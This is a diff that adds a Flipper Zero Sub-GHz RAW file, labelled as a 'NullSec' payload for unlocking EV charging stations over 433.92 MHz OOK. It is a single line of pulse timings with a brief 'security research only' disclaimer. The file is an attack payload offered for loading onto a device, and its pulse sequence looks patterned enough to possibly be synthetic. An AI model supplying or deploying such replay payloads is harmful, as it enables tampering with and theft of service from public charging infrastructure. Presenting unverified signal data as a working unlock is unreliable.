@@ -1,0 +1,9 @@
+Filetype: Flipper SubGhz RAW File
+Version: 1
+Frequency: 433920000
+Preset: FuriHalSubGhzPresetOok650Async
+Protocol: RAW
+# NullSec - EV Charger Station Unlock
+# Some older EV chargers use simple OOK at 433MHz
+# For security research only
+RAW_Data: 512 -512 512 -512 512 -1024 1024 -512 512 -512 1024 -1024 512 -512 512 -1024 1024 -512 512 -512 512 -512 1024 -1024 512 -512 1024 -512 512 -1024 512 -512 512 -512 1024 -1024 512 -512 512 -1024 1024 -512 512 -512 512 -512 1024 -1024 512 -512 1024 -512 512 -1024 512 -512 512 -512 1024 -1024 512 -512 512 -1024
